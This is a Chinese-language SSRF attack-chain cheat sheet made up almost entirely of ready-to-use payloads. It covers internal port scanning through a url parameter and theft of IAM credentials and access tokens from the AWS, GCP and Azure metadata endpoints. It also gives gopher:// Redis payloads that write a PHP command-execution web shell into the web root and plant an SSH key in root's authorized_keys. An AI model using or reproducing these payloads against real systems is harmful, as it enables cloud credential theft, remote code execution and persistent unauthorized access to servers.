# SSRF攻击链

## 基础探测 → 内网漫游

### 1. 探测SSRF

```
?url=http://127.0.0.1:22
?url=http://127.0.0.1:3306
```

### 2. 内网端口扫描

```
?url=http://192.168.1.1:80
?url=http://192.168.1.1:443
?url=http://192.168.1.1:22
?url=http://192.168.1.1:3306
```

---

## 云元数据获取链

### AWS利用

```
1. 探测元数据端点
   http://169.254.169.254/latest/meta-data/

2. 获取IAM凭证
   http://169.254.169.254/latest/meta-data/iam/security-credentials/

3. 利用凭证横向移动
```

### GCP利用

```
1. 探测元数据端点
   http://metadata.google.internal/computeMetadata/v1/

2. 获取服务账号令牌
   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure利用

```
1. 探测元数据端点
   http://169.254.169.254/metadata/instance?api-version=2021-02-01

2. 获取访问令牌
```

---

## Redis攻击链

### 1. 探测Redis

```
?url=gopher://127.0.0.1:6379/_INFO
```

### 2. 写WebShell

```
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0A_CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0A_CONFIG%20SET%20dbfilename%20shell.php%0D%0A_SAVE
```

### 3. 写入SSH公钥

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20%2Froot%2F.ssh%0D%0A_CONFIG%20SET%20dbfilename%20authorized_keys%0D%0A_SET%20sshkey%20%22ssh-rsa%20AAAAB...%22%0D%0A_SAVE
```

---

## 攻击链汇总

| 目标 | Payload | 说明 |
|------|---------|------|
| 内网探测 | `?url=http://192.168.x.x:port` | 端口扫描 |
| AWS元数据 | `?url=http://169.254.169.254/latest/meta-data/` | 获取凭证 |
| Redis写Shell | `gopher://127.0.0.1:6379/...` | 写入WebShell |
| MySQL | `gopher://127.0.0.1:3306/...` | 数据库攻击 |
